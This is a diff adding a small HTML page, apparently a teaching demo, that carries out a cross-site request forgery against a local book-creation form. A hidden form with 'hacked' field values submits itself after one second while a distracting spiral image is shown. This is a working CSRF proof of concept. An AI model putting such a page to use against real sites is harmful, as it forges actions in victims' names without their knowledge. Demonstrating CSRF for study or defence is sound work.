@@ -1,0 +1,20 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>A CSRF attack on the Book creation form</title>
+</head>
+    <body>
+        
+        <p>The form below is not visible:</p>
+        <form id="myForm" style="display:none" action="http://localhost:61489/Home/Create" method="POST">
+            <input id="Title" name="Title" type="text" value="My hacked value for title" />
+            <input id="Genre" name="Genre" type="text" value="My hacked value for genre" />
+            <input type="hidden" id="AuthorId" name="AuthorId" value="3" />
+            <script>
+                setTimeout(function () { window.myForm.submit(); }, 1000);
+            </script>
+        </form>
+        <p>But this distracting picture yes...</p>
+        <img src="http://2.bp.blogspot.com/-5bZS00yxKNk/UbeXc255jCI/AAAAAAAABQs/UbaWDYDFGOI/s1600/-pictures.4ever.eu-_optical_illusion,_spiral_158747.jpg" />
+    </body>
+</html>
